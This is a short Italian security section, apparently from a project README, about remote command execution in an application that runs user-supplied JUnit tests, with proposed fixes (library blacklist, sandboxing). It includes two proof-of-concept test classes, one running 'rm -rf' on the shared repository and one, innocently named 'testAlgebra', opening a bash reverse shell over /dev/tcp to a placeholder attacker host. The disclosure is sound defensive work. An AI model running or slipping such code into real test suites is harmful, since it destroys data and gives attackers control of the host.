# Problemi di sicurezza
A causa della libertà data all'utente per l'esecuzione di test, l'applicazione risulta estremamente vulnerabile ad attacchi di tipo Remote Command Execution (RCE), che consiste nell'esecuzione di codice arbitrario su un server da una locazione remota.

Qui è possibile vedere un semplice esempio di come un utente attaccante potrebbe eliminare totalmente la cartella della repository condivisa:

```java
import org.junit.Test;
import static org.junit.Assert.*;

public class AppTest{
  @Test
  public void breakRepository(){
    try {
      String[] command = {"rm", "-rf", "/repository"};
      Process process = new ProcessBuilder(command).start();
    } catch (Exception e){}
  }
}
```

Nei casi più gravi un attaccante può anche ottenere una shell remota e prendere il controllo totale del container che esegue i test.

```java
import org.junit.Test;
import static org.junit.Assert.*;

public class AppTest{
  @Test
  public void testAlgebra(){
    try {
      String[] command = {"/bin/bash", "-c", "exec 5<>/dev/tcp/attackerip/attackerport;cat <&5 | while read line; do $line 2>&5 >&5; done;"}; 
      Process process = new ProcessBuilder(command).start();
    } catch (Exception e){}
  }
}
```
(Ciò presuppone di essere in ascolto tramite tcp sul proprio ip `attackerip` e sulla porta `attackerport` per ottenere la shell).

Questa vulnerabilità può essere risolta principalmente in due modi:
- utilizzo di una **blacklist** di librerie, per non permettere all'utente di eseguire determinate azioni. Un approccio molto delicato, perché una singola dimenticanza lascia comunque il sistema completamente vulnerabile
- esecuzione dei test in una **sandbox** protetta, in modo tale che qualsiasi tentativo di attacco sia confinato in una zona sicura.